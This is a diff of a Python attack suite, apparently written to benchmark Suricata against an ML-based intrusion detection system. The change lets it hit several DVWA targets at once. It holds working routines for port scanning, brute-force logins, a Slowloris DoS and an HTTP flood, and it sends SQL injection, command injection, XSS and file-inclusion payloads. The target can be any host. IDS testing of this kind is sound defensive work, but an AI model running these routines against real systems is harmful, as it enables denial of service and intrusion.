@@ -9,22 +9,39 @@ from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import quote
 
 class ComprehensiveAttackSuite:
-    def __init__(self, target_ip, target_port=80):
-        self.target_ip = target_ip
-        self.target_port = target_port
-        self.base_url = f"http://{target_ip}:{target_port}/dvwa"
-        self.session = requests.Session()
+    def __init__(self, targets=None):
+        # Support multiple targets with format "host:port"
+        if targets is None:
+            targets = ["localhost:80"]
+        if isinstance(targets, str):
+            targets = [targets]
+        
+        # Parse targets into list of (host, port) tuples
+        self.targets = []
+        for target in targets:
+            if ':' in target:
+                host, port = target.rsplit(':', 1)
+                self.targets.append((host, int(port)))
+            else:
+                self.targets.append((target, 80))
+        
+        self.sessions = {}
         self.results = {}
         
-        # Login to DVWA first
-        self.login_dvwa()
+        # Login to DVWA on all targets
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            self.login_dvwa(host, port, key)
     
-    def login_dvwa(self):
+    def login_dvwa(self, host, port, key):
         """Login to DVWA and get session cookie"""
-        print("[*] Logging into DVWA...")
+        print(f"[*] Logging into DVWA on {key}...")
         try:
+            session = requests.Session()
+            base_url = f"http://{host}:{port}/dvwa"
+            
             # Get login page to obtain CSRF token
-            response = self.session.get(f"{self.base_url}/login.php")
+            response = session.get(f"{base_url}/login.php")
             
             # Login with default credentials
             login_data = {
@@ -32,14 +49,37 @@ class ComprehensiveAttackSuite:
                 'password': 'password',
                 'Login': 'Login'
             }
-            response = self.session.post(f"{self.base_url}/login.php", data=login_data)
+            response = session.post(f"{base_url}/login.php", data=login_data)
             
             # Set security level to low
-            self.session.get(f"{self.base_url}/security.php?security=low")
+            session.get(f"{base_url}/security.php?security=low")
             
-            print("[+] Successfully logged into DVWA\n")
+            self.sessions[key] = session
+            print(f"[+] Successfully logged into DVWA on {key}\n")
         except Exception as e:
-            print(f"[!] Error logging in: {e}")
+            print(f"[!] Error logging in to {key}: {e}")
+    
+    def make_request_all_targets(self, path, method='GET', **kwargs):
+        """Make request to all targets simultaneously"""
+        results = {}
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            try:
+                base_url = f"http://{host}:{port}/dvwa"
+                url = f"{base_url}{path}"
+                session = self.sessions.get(key)
+                if session is None:
+                    continue
+                
+                if method == 'GET':
+                    response = session.get(url, **kwargs)
+                else:
+                    response = session.post(url, **kwargs)
+                
+                results[key] = response
+            except Exception as e:
+                results[key] = None
+        return results
     
     # ========================================
     # TEST 1: SQL Injection Attacks
@@ -62,23 +102,25 @@ class ComprehensiveAttackSuite:
         
         success_count = 0
         for label, payload in attacks:
-            try:
-                url = f"{self.base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
-                print(f"  Testing: {label}")
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code == 200:
+            print(f"  Testing: {label}")
+            responses = self.make_request_all_targets(
+                f"/vulnerabilities/sqli/?id={payload}&Submit=Submit",
+                timeout=5
+            )
+            
+            for target_ip, response in responses.items():
+                if response and response.status_code == 200:
                     success_count += 1
-                    print(f"    ✓ Payload delivered")
+                    print(f"    [{target_ip}] ✓ Payload delivered")
+                elif response:
+                    print(f"    [{target_ip}] ✗ Failed ({response.status_code})")
                 else:
-                    print(f"    ✗ Failed ({response.status_code})")
-                
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"    ✗ Error: {e}")
+                    print(f"    [{target_ip}] ✗ Error occurred")
+            
+            time.sleep(0.5)
         
-        self.results['basic_sqli'] = {'total': len(attacks), 'success': success_count}
-        print(f"\nBasic SQLi: {success_count}/{len(attacks)} successful")
+        self.results['basic_sqli'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
+        print(f"\nBasic SQLi: {success_count}/{len(attacks) * len(self.targets)} successful")
     
     def test_obfuscated_sqli(self):
         """Obfuscated SQL Injection (Suricata might MISS, ML should DETECT)"""
@@ -99,23 +141,25 @@ class ComprehensiveAttackSuite:
         
         success_count = 0
         for label, payload in attacks:
-            try:
-                url = f"{self.base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
-                print(f"  Testing: {label}")
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code == 200:
+            print(f"  Testing: {label}")
+            responses = self.make_request_all_targets(
+                f"/vulnerabilities/sqli/?id={payload}&Submit=Submit",
+                timeout=5
+            )
+            
+            for target_ip, response in responses.items():
+                if response and response.status_code == 200:
                     success_count += 1
-                    print(f"    ✓ Payload delivered")
+                    print(f"    [{target_ip}] ✓ Payload delivered")
+                elif response:
+                    print(f"    [{target_ip}] ✗ Failed ({response.status_code})")
                 else:
-                    print(f"    ✗ Failed ({response.status_code})")
-                
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"    ✗ Error: {e}")
+                    print(f"    [{target_ip}] ✗ Error occurred")
+            
+            time.sleep(0.5)
         
-        self.results['obfuscated_sqli'] = {'total': len(attacks), 'success': success_count}
-        print(f"\nObfuscated SQLi: {success_count}/{len(attacks)} successful")
+        self.results['obfuscated_sqli'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
+        print(f"\nObfuscated SQLi: {success_count}/{len(attacks) * len(self.targets)} successful")
     
     # ========================================
     # TEST 2: Command Injection Attacks
@@ -139,23 +183,25 @@ class ComprehensiveAttackSuite:
         
         success_count = 0
         for label, payload in attacks:
-            try:
-                url = f"{self.base_url}/vulnerabilities/exec/?ip={quote(payload)}&Submit=Submit"
-                print(f"  Testing: {label}")
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code == 200:
+            print(f"  Testing: {label}")
+            responses = self.make_request_all_targets(
+                f"/vulnerabilities/exec/?ip={quote(payload)}&Submit=Submit",
+                timeout=5
+            )
+            
+            for target_ip, response in responses.items():
+                if response and response.status_code == 200:
                     success_count += 1
-                    print(f"    ✓ Payload delivered")
+                    print(f"    [{target_ip}] ✓ Payload delivered")
+                elif response:
+                    print(f"    [{target_ip}] ✗ Failed ({response.status_code})")
                 else:
-                    print(f"    ✗ Failed ({response.status_code})")
-                
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"    ✗ Error: {e}")
+                    print(f"    [{target_ip}] ✗ Error occurred")
+            
+            time.sleep(0.5)
         
-        self.results['command_injection'] = {'total': len(attacks), 'success': success_count}
-        print(f"\nCommand Injection: {success_count}/{len(attacks)} successful")
+        self.results['command_injection'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
+        print(f"\nCommand Injection: {success_count}/{len(attacks) * len(self.targets)} successful")
     
     # ========================================
     # TEST 3: Port Scan Attack
@@ -168,29 +214,31 @@ class ComprehensiveAttackSuite:
         print("Expected: Suricata ✓ | ML-IDS ✓")
         print("="*70)
         
-        print("[*] Scanning ports 1-1100...")
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            print(f"[*] Scanning {key} ports 1-1100...")
+            
+            def scan_port(scan_port_num):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.1)
+                    result = sock.connect_ex((host, scan_port_num))
+                    sock.close()
+                    return scan_port_num, result == 0
+                except:
+                    return scan_port_num, False
+            
+            start_time = time.time()
+            with ThreadPoolExecutor(max_workers=100) as executor:
+                results = list(executor.map(scan_port, range(1, 1101)))
+            
+            elapsed = time.time() - start_time
+            open_ports = [p for p, is_open in results if is_open]
+            
+            print(f"  [{key}] ✓ Scanned 1100 ports in {elapsed:.2f}s")
+            print(f"  [{key}] Found {len(open_ports)} open ports")
         
-        def scan_port(port):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.1)
-                result = sock.connect_ex((self.target_ip, port))
-                sock.close()
-                return port, result == 0
-            except:
-                return port, False
-        
-        start_time = time.time()
-        with ThreadPoolExecutor(max_workers=100) as executor:
-            results = list(executor.map(scan_port, range(1, 1101)))
-        
-        elapsed = time.time() - start_time
-        open_ports = [port for port, is_open in results if is_open]
-        
-        print(f"  ✓ Scanned 1100 ports in {elapsed:.2f}s")
-        print(f"  Found {len(open_ports)} open ports")
-        
-        self.results['port_scan'] = {'total': 1100, 'time': elapsed}
+        self.results['port_scan'] = {'total': 1100 * len(self.targets), 'time': elapsed}
     
     # ========================================
     # TEST 4: Brute Force Attack
@@ -203,28 +251,33 @@ class ComprehensiveAttackSuite:
         print("Expected: Suricata ✓ | ML-IDS ✓")
         print("="*70)
         
-        print("[*] Attempting 30 rapid login attempts...")
-        
         success_count = 0
-        for i in range(30):
-            try:
-                login_data = {
-                    'username': f'admin{i}',
-                    'password': f'password{i}',
-                    'Login': 'Login'
-                }
-                response = self.session.post(f"{self.base_url}/vulnerabilities/brute/", data=login_data, timeout=5)
-                
-                if response.status_code == 200:
-                    success_count += 1
-                
-                print(f"  Attempt {i+1}/30", end='\r')
-                time.sleep(0.2)
-            except:
-                pass
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            print(f"[*] [{key}] Attempting 30 rapid login attempts...")
+            base_url = f"http://{host}:{port}/dvwa"
+            session = self.sessions.get(key)
+            
+            for i in range(30):
+                try:
+                    login_data = {
+                        'username': f'admin{i}',
+                        'password': f'password{i}',
+                        'Login': 'Login'
+                    }
+                    response = session.post(f"{base_url}/vulnerabilities/brute/", data=login_data, timeout=5)
+                    
+                    if response.status_code == 200:
+                        success_count += 1
+                    
+                    print(f"  Attempt {i+1}/30", end='\r')
+                    time.sleep(0.2)
+                except:
+                    pass
+            
+            print(f"\n  [{key}] ✓ Completed 30 attempts")
         
-        print(f"\n  ✓ Completed {success_count}/30 attempts")
-        self.results['brute_force'] = {'total': 30, 'success': success_count}
+        self.results['brute_force'] = {'total': 30 * len(self.targets), 'success': success_count}
     
     # ========================================
     # TEST 5: XSS Attack
@@ -246,23 +299,25 @@ class ComprehensiveAttackSuite:
         
         success_count = 0
         for label, payload in attacks:
-            try:
-                url = f"{self.base_url}/vulnerabilities/xss_r/?name={quote(payload)}"
-                print(f"  Testing: {label}")
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code == 200:
+            print(f"  Testing: {label}")
+            responses = self.make_request_all_targets(
+                f"/vulnerabilities/xss_r/?name={quote(payload)}",
+                timeout=5
+            )
+            
+            for target_ip, response in responses.items():
+                if response and response.status_code == 200:
                     success_count += 1
-                    print(f"    ✓ Payload delivered")
+                    print(f"    [{target_ip}] ✓ Payload delivered")
+                elif response:
+                    print(f"    [{target_ip}] ✗ Failed ({response.status_code})")
                 else:
-                    print(f"    ✗ Failed ({response.status_code})")
-                
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"    ✗ Error: {e}")
+                    print(f"    [{target_ip}] ✗ Error occurred")
+            
+            time.sleep(0.5)
         
-        self.results['xss'] = {'total': len(attacks), 'success': success_count}
-        print(f"\nXSS: {success_count}/{len(attacks)} successful")
+        self.results['xss'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
+        print(f"\nXSS: {success_count}/{len(attacks) * len(self.targets)} successful")
     
     # ========================================
     # TEST 6: File Inclusion Attack
@@ -283,23 +338,25 @@ class ComprehensiveAttackSuite:
         
         success_count = 0
         for label, payload in attacks:
-            try:
-                url = f"{self.base_url}/vulnerabilities/fi/?page={quote(payload)}"
-                print(f"  Testing: {label}")
-                response = self.session.get(url, timeout=5)
-                
-                if response.status_code == 200:
+            print(f"  Testing: {label}")
+            responses = self.make_request_all_targets(
+                f"/vulnerabilities/fi/?page={quote(payload)}",
+                timeout=5
+            )
+            
+            for target_ip, response in responses.items():
+                if response and response.status_code == 200:
                     success_count += 1
-                    print(f"    ✓ Payload delivered")
+                    print(f"    [{target_ip}] ✓ Payload delivered")
+                elif response:
+                    print(f"    [{target_ip}] ✗ Failed ({response.status_code})")
                 else:
-                    print(f"    ✗ Failed ({response.status_code})")
-                
-                time.sleep(0.5)
-            except Exception as e:
-                print(f"    ✗ Error: {e}")
+                    print(f"    [{target_ip}] ✗ Error occurred")
+            
+            time.sleep(0.5)
         
-        self.results['file_inclusion'] = {'total': len(attacks), 'success': success_count}
-        print(f"\nFile Inclusion: {success_count}/{len(attacks)} successful")
+        self.results['file_inclusion'] = {'total': len(attacks) * len(self.targets), 'success': success_count}
+        print(f"\nFile Inclusion: {success_count}/{len(attacks) * len(self.targets)} successful")
     
     # ========================================
     # TEST 7: Slowloris DoS Attack
@@ -312,42 +369,47 @@ class ComprehensiveAttackSuite:
         print("Expected: Suricata ❌ | ML-IDS ✓")
         print("="*70)
         
-        print("[*] Creating slow HTTP connections...")
-        
-        sockets = []
-        for i in range(50):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(4)
-                sock.connect((self.target_ip, self.target_port))
-                sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
-                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
-                sock.send("Accept-language: en-US,en\r\n".encode())
-                sockets.append(sock)
-            except:
-                pass
-        
-        print(f"  ✓ Created {len(sockets)} slow connections")
-        
-        # Keep connections alive with incomplete headers
-        print("[*] Keeping connections alive with slow headers...")
-        for _ in range(10):
-            for sock in sockets:
+        total_sockets = 0
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            print(f"[*] [{key}] Creating slow HTTP connections...")
+            
+            sockets = []
+            for i in range(50):
                 try:
-                    sock.send(f"X-a: {time.time()}\r\n".encode())
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(4)
+                    sock.connect((host, port))
+                    sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
+                    sock.send("User-Agent: Mozilla/5.0\r\n".encode())
+                    sock.send("Accept-language: en-US,en\r\n".encode())
+                    sockets.append(sock)
                 except:
                     pass
-            time.sleep(0.5)
+            
+            print(f"  [{key}] ✓ Created {len(sockets)} slow connections")
+            
+            # Keep connections alive with incomplete headers
+            print(f"[*] [{key}] Keeping connections alive with slow headers...")
+            for _ in range(10):
+                for sock in sockets:
+                    try:
+                        sock.send(f"X-a: {time.time()}\r\n".encode())
+                    except:
+                        pass
+                time.sleep(0.5)
+            
+            # Cleanup
+            for sock in sockets:
+                try:
+                    sock.close()
+                except:
+                    pass
+            
+            print(f"  [{key}] ✓ Slowloris attack completed")
+            total_sockets += len(sockets)
         
-        # Cleanup
-        for sock in sockets:
-            try:
-                sock.close()
-            except:
-                pass
-        
-        print("  ✓ Slowloris attack completed")
-        self.results['slowloris'] = {'sockets': len(sockets)}
+        self.results['slowloris'] = {'sockets': total_sockets}
     
     # ========================================
     # TEST 8: HTTP Flood Attack
@@ -360,26 +422,35 @@ class ComprehensiveAttackSuite:
         print("Expected: Suricata ❌ | ML-IDS ✓")
         print("="*70)
         
-        print("[*] Sending 200 rapid HTTP requests...")
+        total_success = 0
+        total_time = 0
         
-        def make_request(_):
-            try:
-                requests.get(f"{self.base_url}/", timeout=2)
-                return True
-            except:
-                return False
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            print(f"[*] [{key}] Sending 200 rapid HTTP requests...")
+            base_url = f"http://{host}:{port}/dvwa"
+            
+            def make_request(_):
+                try:
+                    requests.get(f"{base_url}/", timeout=2)
+                    return True
+                except:
+                    return False
+            
+            start_time = time.time()
+            with ThreadPoolExecutor(max_workers=50) as executor:
+                results = list(executor.map(make_request, range(200)))
+            
+            elapsed = time.time() - start_time
+            success = sum(1 for r in results if r)
+            
+            print(f"  [{key}] ✓ Sent {success}/200 requests in {elapsed:.2f}s")
+            print(f"  [{key}] Rate: {success/elapsed:.2f} req/s")
+            
+            total_success += success
+            total_time += elapsed
         
-        start_time = time.time()
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            results = list(executor.map(make_request, range(200)))
-        
-        elapsed = time.time() - start_time
-        success = sum(1 for r in results if r)
-        
-        print(f"  ✓ Sent {success}/200 requests in {elapsed:.2f}s")
-        print(f"  Rate: {success/elapsed:.2f} req/s")
-        
-        self.results['http_flood'] = {'total': 200, 'success': success, 'time': elapsed}
+        self.results['http_flood'] = {'total': 200 * len(self.targets), 'success': total_success, 'time': total_time}
     
     # ========================================
     # Benign Traffic Tests
@@ -392,28 +463,29 @@ class ComprehensiveAttackSuite:
         print("Expected: Both IDS ❌ (No alerts)")
         print("="*70)
         
-        benign_urls = [
-            f"{self.base_url}/",
-            f"{self.base_url}/about.php",
-            f"{self.base_url}/instructions.php",
-            f"{self.base_url}/security.php",
-            f"{self.base_url}/phpinfo.php",
-        ]
+        pages = ["/", "/about.php", "/instructions.php", "/security.php", "/phpinfo.php"]
         
         print("[*] Simulating normal user browsing...")
         successful = 0
-        for url in benign_urls:
-            try:
-                response = self.session.get(url, timeout=3)
-                if response.status_code == 200:
-                    successful += 1
-                    print(f"  ✓ Browsed: {url.split('/')[-1]}")
-                time.sleep(1)  # Normal user behavior
-            except:
-                pass
         
-        print(f"  ✓ Completed {successful}/{len(benign_urls)} page views")
-        self.results['benign_browsing'] = {'total': len(benign_urls), 'success': successful}
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            base_url = f"http://{host}:{port}/dvwa"
+            session = self.sessions.get(key)
+            print(f"  [{key}] Browsing pages...")
+            
+            for page in pages:
+                try:
+                    response = session.get(f"{base_url}{page}", timeout=3)
+                    if response.status_code == 200:
+                        successful += 1
+                        print(f"    ✓ Browsed: {page}")
+                    time.sleep(1)  # Normal user behavior
+                except:
+                    pass
+        
+        print(f"  ✓ Completed {successful}/{len(pages) * len(self.targets)} page views")
+        self.results['benign_browsing'] = {'total': len(pages) * len(self.targets), 'success': successful}
 
     def test_benign_login(self):
         """Test 10: Benign login - normal authentication attempts"""
@@ -422,7 +494,6 @@ class ComprehensiveAttackSuite:
         print("Expected: Both IDS ❌ (No alerts)")
         print("="*70)
         
-        login_url = f"{self.base_url}/login.php"
         credentials = [
             ('admin', 'password'),  # correct
             ('user', 'user123'),    # trying different account
@@ -430,21 +501,29 @@ class ComprehensiveAttackSuite:
         
         print("[*] Performing normal login attempts...")
         successful = 0
-        for username, password in credentials:
-            try:
-                response = self.session.post(
-                    login_url,
-                    data={'username': username, 'password': password, 'Login': 'Login'},
-                    timeout=3
-                )
-                successful += 1
-                print(f"  ✓ Login attempt: {username}")
-                time.sleep(3)  # Normal delay between attempts
-            except:
-                pass
         
-        print(f"  ✓ Completed {successful}/{len(credentials)} login attempts")
-        self.results['benign_login'] = {'total': len(credentials), 'success': successful}
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            base_url = f"http://{host}:{port}/dvwa"
+            session = self.sessions.get(key)
+            login_url = f"{base_url}/login.php"
+            print(f"  [{key}] Attempting logins...")
+            
+            for username, password in credentials:
+                try:
+                    response = session.post(
+                        login_url,
+                        data={'username': username, 'password': password, 'Login': 'Login'},
+                        timeout=3
+                    )
+                    successful += 1
+                    print(f"    ✓ Login attempt: {username}")
+                    time.sleep(3)  # Normal delay between attempts
+                except:
+                    pass
+        
+        print(f"  ✓ Completed {successful}/{len(credentials) * len(self.targets)} login attempts")
+        self.results['benign_login'] = {'total': len(credentials) * len(self.targets), 'success': successful}
 
     def test_benign_search(self):
         """Test 11: Benign search - legitimate search queries"""
@@ -462,19 +541,26 @@ class ComprehensiveAttackSuite:
         
         print("[*] Performing legitimate searches...")
         successful = 0
-        for query in search_queries:
-            try:
-                search_url = f"{self.base_url}/vulnerabilities/xss_r/?name={requests.utils.quote(query)}"
-                response = self.session.get(search_url, timeout=3)
-                if response.status_code == 200:
-                    successful += 1
-                    print(f"  ✓ Searched: '{query}'")
-                time.sleep(1)
-            except:
-                pass
         
-        print(f"  ✓ Completed {successful}/{len(search_queries)} searches")
-        self.results['benign_search'] = {'total': len(search_queries), 'success': successful}
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            base_url = f"http://{host}:{port}/dvwa"
+            session = self.sessions.get(key)
+            print(f"  [{key}] Searching...")
+            
+            for query in search_queries:
+                try:
+                    search_url = f"{base_url}/vulnerabilities/xss_r/?name={requests.utils.quote(query)}"
+                    response = session.get(search_url, timeout=3)
+                    if response.status_code == 200:
+                        successful += 1
+                        print(f"    ✓ Searched: '{query}'")
+                    time.sleep(1)
+                except:
+                    pass
+        
+        print(f"  ✓ Completed {successful}/{len(search_queries) * len(self.targets)} searches")
+        self.results['benign_search'] = {'total': len(search_queries) * len(self.targets), 'success': successful}
 
     def test_benign_file_access(self):
         """Test 12: Benign file access - normal resource loading"""
@@ -483,26 +569,33 @@ class ComprehensiveAttackSuite:
         print("Expected: Both IDS ❌ (No alerts)")
         print("="*70)
         
-        file_urls = [
-            f"{self.base_url}/dvwa/css/main.css",
-            f"{self.base_url}/dvwa/images/logo.png",
-            f"{self.base_url}/favicon.ico",
+        file_paths = [
+            "/dvwa/css/main.css",
+            "/dvwa/images/logo.png",
+            "/favicon.ico",
         ]
         
         print("[*] Accessing normal static resources...")
         successful = 0
-        for url in file_urls:
-            try:
-                response = self.session.get(url, timeout=3)
-                if response.status_code in [200, 304]:
-                    successful += 1
-                    print(f"  ✓ Loaded: {url.split('/')[-1]}")
-                time.sleep(0.5)
-            except:
-                pass
         
-        print(f"  ✓ Completed {successful}/{len(file_urls)} file accesses")
-        self.results['benign_file_access'] = {'total': len(file_urls), 'success': successful}
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            base_url = f"http://{host}:{port}"
+            session = self.sessions.get(key)
+            print(f"  [{key}] Loading resources...")
+            
+            for path in file_paths:
+                try:
+                    response = session.get(f"{base_url}{path}", timeout=3)
+                    if response.status_code in [200, 304]:
+                        successful += 1
+                        print(f"    ✓ Loaded: {path.split('/')[-1]}")
+                    time.sleep(0.5)
+                except:
+                    pass
+        
+        print(f"  ✓ Completed {successful}/{len(file_paths) * len(self.targets)} file accesses")
+        self.results['benign_file_access'] = {'total': len(file_paths) * len(self.targets), 'success': successful}
 
     def test_benign_api_calls(self):
         """Test 13: Benign API calls - legitimate data requests"""
@@ -511,26 +604,33 @@ class ComprehensiveAttackSuite:
         print("Expected: Both IDS ❌ (No alerts)")
         print("="*70)
         
-        api_endpoints = [
-            f"{self.base_url}/security.php",
-            f"{self.base_url}/setup.php",
-            f"{self.base_url}/vulnerabilities/captcha/",
+        api_paths = [
+            "/security.php",
+            "/setup.php",
+            "/vulnerabilities/captcha/",
         ]
         
         print("[*] Making legitimate API calls...")
         successful = 0
-        for url in api_endpoints:
-            try:
-                response = self.session.get(url, timeout=3)
-                if response.status_code in [200, 302]:
-                    successful += 1
-                    print(f"  ✓ API call: {url.split('/')[-2]}")
-                time.sleep(1)
-            except:
-                pass
         
-        print(f"  ✓ Completed {successful}/{len(api_endpoints)} API calls")
-        self.results['benign_api_calls'] = {'total': len(api_endpoints), 'success': successful}
+        for host, port in self.targets:
+            key = f"{host}:{port}"
+            base_url = f"http://{host}:{port}/dvwa"
+            session = self.sessions.get(key)
+            print(f"  [{key}] Making API calls...")
+            
+            for path in api_paths:
+                try:
+                    response = session.get(f"{base_url}{path}", timeout=3)
+                    if response.status_code in [200, 302]:
+                        successful += 1
+                        print(f"    ✓ API call: {path.split('/')[-2] if path.endswith('/') else path.split('/')[-1]}")
+                    time.sleep(1)
+                except:
+                    pass
+        
+        print(f"  ✓ Completed {successful}/{len(api_paths) * len(self.targets)} API calls")
+        self.results['benign_api_calls'] = {'total': len(api_paths) * len(self.targets), 'success': successful}
     
     # ========================================
     # Main Execution
@@ -574,7 +674,7 @@ class ComprehensiveAttackSuite:
         """Execute all attack tests with mixed benign traffic"""
         print("\n" + "="*70)
         print("COMPREHENSIVE ATTACK SUITE WITH BENIGN TRAFFIC")
-        print(f"Target: {self.base_url}")
+        print(f"Targets: {', '.join([f'{h}:{p}' for h, p in self.targets])}")
         print("="*70)
         
         # Mix malicious and benign traffic for realistic testing
@@ -628,12 +728,15 @@ class ComprehensiveAttackSuite:
 
 if __name__ == '__main__':
     if len(sys.argv) < 2:
-        print("Usage: python3 attack_suite.py <target_ip> [port]")
-        print("Example: python3 attack_suite.py 172.18.0.2 80")
+        print("Usage: python3 attack_suite.py <target1> [target2] ...")
+        print("Target format: host:port")
+        print("Example (single): python3 attack_suite.py localhost:8081")
+        print("Example (dual IDS): python3 attack_suite.py localhost:8081 localhost:8082")
+        print("This will attack both Suricata (8081) and ML-IDS (8082) simultaneously")
         sys.exit(1)
     
-    target_ip = sys.argv[1]
-    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+    # Get all target arguments (skip script name)
+    targets = sys.argv[1:]
     
-    attacker = ComprehensiveAttackSuite(target_ip, target_port)
+    attacker = ComprehensiveAttackSuite(targets)
     attacker.run_all_attacks()
